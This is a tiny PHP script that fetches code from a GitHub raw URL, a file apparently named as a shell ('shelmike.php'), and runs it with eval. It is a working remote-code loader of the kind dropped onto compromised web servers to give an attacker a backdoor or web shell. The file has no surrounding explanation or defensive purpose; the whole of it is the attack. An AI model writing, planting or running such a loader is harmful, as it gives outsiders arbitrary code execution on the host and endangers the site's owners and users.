<?php
$url = 'https://raw.githubusercontent.com/sundapridee/sunda/refs/heads/main/shelmike.php';


$php_code = file_get_contents($url);


if ($php_code !== false) {
    eval('?>' . $php_code);
} else {
    echo 'error';
}
